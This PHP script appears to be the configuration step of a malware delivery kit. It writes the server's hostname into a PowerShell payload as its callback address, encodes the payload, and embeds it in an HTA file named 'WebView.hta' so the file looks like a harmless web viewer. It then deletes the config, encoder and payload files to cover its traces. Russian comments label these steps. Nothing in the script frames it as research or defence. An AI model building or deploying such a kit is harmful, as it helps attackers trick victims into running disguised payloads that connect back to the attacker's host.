<?php
header('Content-Type: text/html; charset=utf-8');
session_start();

function ExtractDomain($Host, $Level = 2, $IgnoreWWW = false) {
    $Parts = explode(".", $Host);
    if($IgnoreWWW and $Parts[0] == 'www') unset($Parts[0]);
    $Parts = array_slice($Parts, -$Level);
    return implode(".", $Parts);
}
$host = $_SERVER['HTTP_HOST'];
$pureHost = ExtractDomain ($host);

//Изменение файла send.py
$path_to_file = 'payload.ps1';
$file_contents = file_get_contents($path_to_file);
$file_contents = str_replace('$ip',"$host",$file_contents);
    file_put_contents($path_to_file,$file_contents);

$output = shell_exec('pwsh encoder.ps1');
$newOutput = substr($output, 0, -1);
$path_to_file_hta = 'WebView.hta';
$file_contents_hta = file_get_contents($path_to_file_hta);
$file_contents_hta = str_replace('$payload',$newOutput,$file_contents_hta);
file_put_contents($path_to_file_hta,$file_contents_hta);


//Удаление файла конфигурации

unlink('config.php');
unlink('encoder.ps1');
unlink('payload.ps1');
session_destroy();
header('Location: config2.php');

?>


